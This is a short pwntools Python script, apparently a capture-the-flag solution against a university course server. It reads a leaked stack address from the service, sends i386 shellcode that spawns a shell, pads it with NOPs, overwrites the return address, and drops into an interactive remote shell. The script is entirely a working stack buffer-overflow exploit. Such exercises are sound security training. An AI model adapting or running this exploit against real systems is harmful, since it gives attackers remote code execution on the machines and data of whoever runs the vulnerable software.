from pwn import *

context.terminal = ["gnome-terminal", "--"]
p = remote("ctf-fsi.fe.up.pt", 4001)
# gdb.attach(p)

p.recvuntil([b" is "])

address = p.recvline(keepends=False)[:-1]
address = int(address, 16)

info("Address: " + hex(address))

payload = shellcraft.i386.linux.sh()
payload += (100 - len(asm(payload))) * shellcraft.i386.nop()
payload = asm(payload)

payload += p32(0) + p32(0) + p32(address)

p.sendlineafter(b":", payload)
p.interactive()



